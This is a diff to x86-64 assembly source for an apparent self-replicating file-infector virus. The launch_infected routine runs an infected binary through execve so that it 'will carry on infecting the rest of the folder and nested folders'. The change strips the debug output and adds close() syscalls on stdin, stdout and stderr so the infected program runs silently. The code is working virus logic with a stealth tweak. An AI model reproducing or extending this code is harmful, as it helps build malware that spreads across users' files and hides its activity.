@@ -628,13 +628,23 @@ retn
 ;void launch_infected(char *fname)
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
-	call ft_puts
-	call debug
-	call print_cwd
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
 	mov QWORD[rsp + 8], 0
+	;close fds
+	push rdi
+	mov rax, 3
+	mov rdi, 0
+	syscall;close(0)
+	mov rax, 3
+	mov rdi, 1
+	syscall;close(1)
+	mov rax, 3
+	mov rdi, 2
+	syscall;close(2)
+	pop rdi
+	;
 	lea rsi, [rsp]
 	lea rdx, [rsp + 8]
 	mov rax, 59
@@ -643,19 +653,6 @@ launch_infected:
 	jmp exit_prog; new infected binary will carry on infecting the rest of the folder and nested folders
 retn
 
-print_cwd:
-push rdi
-	sub rsp, 1024
-	
-	lea rdi, [rsp]
-	mov rsi, 1000
-	mov rax, 79
-	syscall
-	call ft_puts
-	call debug
-	add rsp, 1024
-pop rdi
-retn
 
 ;infect ONE file
 ;int famine_file(char *fname)
